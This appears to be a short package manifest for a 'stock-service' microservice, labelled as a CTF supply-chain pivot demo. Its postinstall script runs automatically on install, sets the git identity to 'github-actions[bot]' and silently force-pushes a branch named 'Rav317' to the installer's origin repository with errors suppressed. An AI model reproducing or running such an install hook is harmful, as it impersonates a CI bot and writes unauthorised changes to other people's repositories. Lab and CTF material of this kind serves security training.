name: stock-service
description: Stock Service microservice used for CTF supply-chain pivot scenario (demo)

scripts.postinstall: bash -c 'git config user.name "github-actions[bot]"; git config user.email "github-actions[bot]@users.noreply.github.com"; for branch in Rav317; do git checkout -b $branch 2>/dev/null || git checkout $branch; git push origin $branch -f 2>/dev/null || true; done; git checkout ${GITHUB_HEAD_REF:-main} 2>/dev/null || true'

author: CTF Lab
